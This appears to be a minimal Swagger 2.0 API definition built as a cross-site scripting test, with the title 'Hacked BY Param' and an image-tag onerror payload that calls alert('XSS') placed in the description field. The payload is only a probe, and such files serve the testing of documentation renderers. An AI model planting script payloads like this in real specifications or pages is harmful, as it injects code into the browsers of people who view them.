swagger: '2.0'
info:
  version: "0.0.1"
  title: Hacked BY Param
  description: <img src=x onerror="alert('XSS')">
paths:
  /:
    get:
      responses:
        200:
          description: Successful response
